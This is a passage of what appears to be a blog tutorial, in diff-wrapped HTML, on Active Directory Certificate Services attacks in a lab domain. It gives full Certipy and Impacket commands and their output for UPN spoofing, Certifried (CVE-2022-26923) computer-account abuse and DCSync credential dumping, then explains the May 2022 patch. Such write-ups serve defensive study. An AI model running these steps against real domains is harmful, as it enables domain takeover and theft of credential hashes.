+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Verify</span> <span class="n">that</span> <span class="n">the</span> <span class="n">username</span> <span class="s1">'administrator'</span> <span class="n">matches</span> <span class="n">the</span> <span class="n">certificate</span> <span class="n">UPN</span><span class="p">:</span> <span class="n">administrator</span>
+</pre></div>
+<p>This happens because—as we explained at the beginning of the article—when looking at how the <code>KRB_AS_REQ</code> message is built, the KDC checks whether the UPN in the certificate matches the account specified in the username field of the <code>KRB_AS_REQ</code> message. In this case, it doesn’t match: the UPN refers to <code>claire</code> (because she originally had the UPN set to <code>administrator</code> when the certificate was issued), while the username in the request refers to the real <code>administrator</code> account.</p><br/>
+<p>So, let’s reset <code>claire</code>’s UPN. I’ll just set it back to <code>claire@elswixcorp.local</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">claire</span> <span class="o">-</span><span class="n">upn</span> <span class="n">claire</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">user</span> <span class="s1">'claire'</span><span class="p">:</span>
+    <span class="n">userPrincipalName</span>                   <span class="p">:</span> <span class="n">claire</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">'claire'</span>
+</pre></div>
+<p>Now, let’s perform the authentication again:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'administrator.ccache'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'administrator'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'administrator@elswixcorp.local'</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span>
+</pre></div>
+<p>And ka-boom—we’re authenticated as <strong>Administrator</strong>. Thanks to Certipy, in addition to receiving a TGT, we also obtain the associated NT hash, which can of course be used for further authentication.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span>
+<span class="n">SMB</span>         <span class="mf">192.168.100.2</span>   <span class="mi">445</span>    <span class="n">DC02</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC02</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> 
+<span class="n">SMB</span>         <span class="mf">192.168.100.2</span>   <span class="mi">445</span>    <span class="n">DC02</span>             <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">administrator</span><span class="p">:</span><span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span> <span class="nd">(</span><span class="nd">Pwn3d</span><span class="nd">!</span><span class="nd">)</span>
+</pre></div>
+<h3>Certifried (CVE-2022–26923)</h3><br/>
+<p><strong>Certifried</strong> is a domain privilege escalation vulnerability that affected all ADCS instances prior to the patch for CVE-2022–26923. It abuses the implicit mapping mechanism used by the KDC, similarly to what we demonstrated earlier—but this time, it leverages <strong>computer accounts</strong> and the <strong>Machine</strong> certificate template (which domain-joined computers can enroll by default).</p><br/>
+<p>To exploit this vulnerability, the attacker only needs the ability to create a new computer account in the domain. By default, every domain user is allowed to add up to 10 machines to Active Directory. When a user creates a computer account, they are automatically granted several permissions over it, including:</p><br/>
+<ul>
+<li><strong>Validated write to DNS host name</strong> (<code>dNSHostName</code>)</li>
+<li><strong>Validated write to service principal name</strong> (<code>servicePrincipalName</code>)</li>
+</ul>
+<p>As we discussed earlier, when enrolling for a certificate using the <code>Machine</code> template, the value of the <code>dNSHostName</code> attribute is included in the SAN field of the certificate and is used by the KDC during authentication. This means that if an attacker changes the <code>dNSHostName</code> of their owned computer account to match that of a Domain Controller (e.g., <code>dc.elswixcorp.local</code>), requests a certificate using the <code>Machine</code> template and the computer’s credentials, and then resets the <code>dNSHostName</code> back to a non-conflicting value, the certificate will still be valid and when used for authentication will be <strong>implicitly mapped to the DC’s computer account</strong>.</p><br/>
+<p>Unlike UPNs, <code>dNSHostName</code> values are <strong>not required to be unique</strong> across domain accounts. This means that multiple computer accounts can technically share the same <code>dNSHostName</code>, and Active Directory will not enforce uniqueness at that level. However, modifying the <code>dNSHostName</code> causes the Domain Controller to automatically update the SPNs (specifically those that include the FQDN, e.g. <code>CIFS/dc.domain.local</code>) to reflect the new hostname. If the resulting SPNs already exist on another account—such as the real Domain Controller—this triggers a <strong>constraint violation</strong>.</p><br/>
+<p>Fortunately, because the user who creates a computer account is granted the <code>Validated write to service principal name</code> permission, you can simply <strong>clear the SPNs</strong> (or at least those that reflect the <code>dNSHostName</code> value) of your controlled machine account before modifying its <code>dNSHostName</code>. This bypasses the constraint violation, allowing you to successfully update the hostname without conflict.</p><br/>
+<h3>Practice</h3><br/>
+<p>Let's walk through the steps to exploit this vulnerability from the perspective of a <strong>non-privileged domain user</strong>. In this demonstration, we’ll use <code>claire</code>'s credentials—who is just a regular domain user.</p><br/>
+<p>First, since this attack requires the ability to add a new computer account to the domain, we need to verify that the <code>MachineAccountQuota</code> attribute is greater than zero. By default, Active Directory allows any authenticated user to add up to <strong>10</strong> machines.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">ldap</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">u</span> <span class="n">claire</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password3</span><span class="n">!</span> <span class="o">-</span><span class="n">M</span> <span class="n">maq</span>
+<span class="n">LDAP</span>        <span class="mf">192.168.100.2</span>   <span class="mi">389</span>    <span class="n">DC02</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC02</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span>
+<span class="n">LDAP</span>        <span class="mf">192.168.100.2</span>   <span class="mi">389</span>    <span class="n">DC02</span>             <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">claire</span><span class="p">:</span><span class="n">Password3</span><span class="n">!</span>
+<span class="n">MAQ</span>         <span class="mf">192.168.100.2</span>   <span class="mi">389</span>    <span class="n">DC02</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">the</span> <span class="n">MachineAccountQuota</span>
+<span class="n">MAQ</span>         <span class="mf">192.168.100.2</span>   <span class="mi">389</span>    <span class="n">DC02</span>             <span class="n">MachineAccountQuota</span><span class="p">:</span> <span class="mi">10</span>
+</pre></div>
+<p>As shown, the <code>MachineAccountQuota</code> is set to <strong>10</strong>, which is the default value—this means we’re good to go.</p><br/>
+<p>Next, let’s add a new computer to the domain. We can do this using the <a href="https://github.com/fortra/impacket/blob/master/examples/addcomputer.py"><code>addcomputer.py</code></a> script from the <strong>Impacket</strong> suite:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">addcomputer</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">claire</span><span class="p">:</span><span class="n">Password3</span><span class="n">!</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">computer</span><span class="o">-</span><span class="n">name</span> <span class="n">clairepc01</span> <span class="o">-</span><span class="n">computer</span><span class="o">-</span><span class="k">pass</span> <span class="s1">'Start123!'</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">machine</span> <span class="n">account</span> <span class="n">clairepc01</span><span class="n">$</span> <span class="k">with</span> <span class="n">password</span> <span class="n">Start123</span><span class="n">!</span><span class="o">.</span>
+</pre></div>
+<p>Perfect. The computer account <code>clairepc01$</code> was successfully created in the domain.</p><br/>
+<p>Before requesting a certificate, we must modify the new computer’s <code>dNSHostName</code> to match that of the <strong>Domain Controller</strong>.</p><br/>
+<p>By default, the <code>dNSHostName</code> of a computer account is structured as:</p><br/>
+<div class="highlight"><pre><span></span><span class="p">(</span><span class="n">ComputerName</span><span class="p">)</span><span class="o">.</span><span class="n">domain</span><span class="o">.</span><span class="n">local</span>
+</pre></div>
+<p>So, for a Domain Controller named <code>dc02</code>, its <code>dNSHostName</code> will typically be <code>dc02.elswixcorp.local</code>.</p><br/>
+<p><strong>Note:</strong> The <code>$</code> symbol used in the <code>sAMAccountName</code> is <strong>not</strong> included in the <code>dNSHostName</code>.</p><br/>
+<p>However, as we’ve discussed earlier, you can assign any arbitrary <code>dNSHostName</code> to a computer account—provided that SPNs don’t conflict. To confirm the exact value used by the DC, we can use Certipy (or LDAP tools) to query it:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="nd">$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">read</span> <span class="o">-</span><span class="n">u</span> <span class="n">claire</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password3</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">dc02$</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">dNSHostName</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+    <span class="n">dNSHostName</span>                         <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+</pre></div>
+<p>As expected, the <code>dNSHostName</code> of the DC is <code>dc02.elswixcorp.local</code>, but it’s always good to verify.</p><br/>
+<p>Now, let’s update the <code>dNSHostName</code> of our new machine (<code>clairepc01$</code>) to impersonate the Domain Controller:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="nd">$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="o">-</span><span class="n">u</span> <span class="n">claire</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password3</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">clairepc01$</span> <span class="o">-</span><span class="n">dns</span> <span class="n">dc02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">user</span> <span class="s1">'clairepc01$'</span><span class="p">:</span>
+    <span class="n">dNSHostName</span>                         <span class="p">:</span> <span class="n">dc02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">'clairepc01$'</span>
+</pre></div>
+<p>Success! The <code>dNSHostName</code> of <code>clairepc01$</code> was updated to match that of the DC. This worked because Active Directory allows multiple accounts to share the same <code>dNSHostName</code>, unlike UPNs.</p><br/>
+<p>If we had received a <code>CONSTRAINT_ATT_TYPE</code> error, it would have indicated that the domain controller is patched and is blocking us from setting an arbitrary <code>dnsHostName</code> using our limited write permissions.</p><br/>
+<p>At this point, we’re ready to request a certificate using our new computer account. Since it’s a machine account, we’ll enroll using the <strong><code>Machine</code> template</strong>, which is typically allowed for computer objects:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="nd">$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">u</span> <span class="n">clairepc01$</span> <span class="o">-</span><span class="n">p</span> <span class="n">Start123</span><span class="n">!</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">template</span> <span class="n">Machine</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC02-CA'</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">50</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">DNS</span> <span class="n">Host</span> <span class="n">Name</span> <span class="s1">'dc02.elswixcorp.local'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">has</span> <span class="n">no</span> <span class="nb">object</span> <span class="n">SID</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'dc02.pfx'</span>
+</pre></div>
+<p>Excellent. We’ve successfully enrolled a certificate for our fake computer account, and Certipy confirms that the SAN includes <code>dc02.elswixcorp.local</code>—which is the identity we want to impersonate.</p><br/>
+<p>As in the user-based attack, before using the certificate, we need to <strong>reset the <code>dNSHostName</code> back</strong> to avoid mismatches during authentication:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="nd">$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="o">-</span><span class="n">u</span> <span class="n">claire</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password3</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">clairepc01$</span> <span class="o">-</span><span class="n">dns</span> <span class="n">clairepc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">user</span> <span class="s1">'clairepc01$'</span><span class="p">:</span>
+    <span class="n">dNSHostName</span>                         <span class="p">:</span> <span class="n">clairepc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">'clairepc01$'</span>
+</pre></div>
+<p>Now we’re ready to authenticate using the certificate. Let’s proceed and attempt authentication as the Domain Controller (<code>dc02$</code>) using the certificate we just obtained:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">dc02</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">dc02</span><span class="n">$</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'dc02.ccache'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'dc02$'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'dc02$@elswixcorp.local'</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">01786</span><span class="n">f14a9162774852587e9d4104302</span>
+</pre></div>
+<p><strong>Pwned!</strong> The KDC validated the certificate by matching the <code>dNSHostName</code> in the SAN with the real <code>dc02$</code> machine account. We authenticated successfully, and as a bonus, Certipy retrieved the machine’s <strong>NT hash</strong>.</p><br/>
+<p>With this, we now have the ability to <strong>DCSync</strong> the domain:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="s1">'elswixcorp.local/dc02$@dc02.elswixcorp.local'</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">01786</span><span class="n">f14a9162774852587e9d4104302</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">RemoteOperations</span> <span class="n">failed</span><span class="p">:</span> <span class="n">DCERPC</span> <span class="n">Runtime</span> <span class="n">Error</span><span class="p">:</span> <span class="n">code</span><span class="p">:</span> <span class="mh">0x5</span> <span class="o">-</span> <span class="n">rpc_s_access_denied</span> 
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">DRSUAPI</span> <span class="n">method</span> <span class="n">to</span> <span class="n">get</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">DIT</span> <span class="n">secrets</span>
+<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span><span class="p">:::</span>
+<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
+<span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">ffb94f094a63f5d138500ecf5d4d0b51</span><span class="p">:::</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="o">...</span>
+</pre></div>
+<h3>Certifried Patch (May 2022 Security Update)</h3><br/>
+<p>This vulnerability was patched as part of the May 2022 security updates, which introduced new security mechanisms to ADCS. A new extension, <code>szOID_NTDS_CA_SECURITY_EXT</code>, was implemented to prevent these types of attacks from being exploited via UPN or dNSHostName manipulation. This extension includes a new attribute called <code>objectSid</code>, which is embedded in every certificate issued by patched systems, <em>but only in templates that do not have the</em> <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> <em>flag set</em>.</p><br/>
+<p>This means that <strong>ESC1</strong> could still be viable. However, as we will see later, this is not the case, at least not with the default domain controller configuration.</p><br/>
+<p>The <code>objectSid</code> attribute contains the SID of the account that requested the certificate. Since the <code>objectSid</code> is unique and cannot be modified, it directly links the certificate to the user who requested it, effectively rendering the vulnerability unexploitable.</p><br/>
+<p>When the KDC receives the <code>KRB_AS_REQ</code> message, it extracts the <code>objectSid</code> attribute and searches for that SID in Active Directory. If a matching account is found, the KDC verifies whether it corresponds to the UPN specified in the SAN. This means that if the UPN in the SAN belongs to a different account than the one associated with the <code>objectSid</code> value, authentication will fail.</p><br/>
+<h3>Patch Demonstration</h3><br/>
+<p>I fully updated the <code>DC01</code> domain controller, which hosts the domain’s <code>RootCA</code>. From this point on, we will be interacting with <code>elswixcorp-DC01-CA</code>, which is now patched.</p><br/>
+<p>This patch completely breaks traditional certificate exploitation scenarios—<strong>ESC6</strong>, for example. As mentioned earlier, every certificate that is not issued using a template with the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag includes the <code>objectSid</code> extension.</p><br/>
+<p>In the case of <strong>ESC6</strong>, you're allowed to specify your own SAN in certificate requests, even if the template does <strong>not</strong> have the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag enabled. However, despite being able to specify an arbitrary SAN, the final certificate will still include the <code>objectSid</code> extension, which prevents privilege escalation.</p><br/>
+<p>For example, let’s use <code>certipy</code> to test whether the updated CA is vulnerable to <strong>ESC6</strong>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">find</span> <span class="o">-</span><span class="n">vulnerable</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span>  <span class="o">-</span><span class="n">stdout</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">35</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">authorities</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">certificate</span> <span class="n">authorities</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">25</span> <span class="n">enabled</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">CA</span> <span class="n">configuration</span> <span class="k">for</span> <span class="s1">'elswixcorp-DC01-CA'</span> <span class="n">via</span> <span class="n">CSRA</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumeration</span> <span class="n">output</span><span class="p">:</span>
+<span class="n">Certificate</span> <span class="n">Authorities</span>
+  <span class="mi">0</span>
+    <span class="n">CA</span> <span class="n">Name</span>                             <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>
+    <span class="n">DNS</span> <span class="n">Name</span>                            <span class="p">:</span> <span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+    <span class="n">Certificate</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+    <span class="n">Certificate</span> <span class="n">Serial</span> <span class="n">Number</span>           <span class="p">:</span> <span class="mi">1</span><span class="n">A66B5E7D16772A94482CC2F0BB1D1C9</span>
+    <span class="n">Certificate</span> <span class="n">Validity</span> <span class="n">Start</span>          <span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">02</span> <span class="mi">13</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">10</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+    <span class="n">Certificate</span> <span class="n">Validity</span> <span class="n">End</span>            <span class="p">:</span> <span class="mi">2030</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">02</span> <span class="mi">13</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">09</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+    <span class="n">Web</span> <span class="n">Enrollment</span>                      <span class="p">:</span> <span class="n">Enabled</span>
+    <span class="n">User</span> <span class="n">Specified</span> <span class="n">SAN</span>                  <span class="p">:</span> <span class="n">Enabled</span>
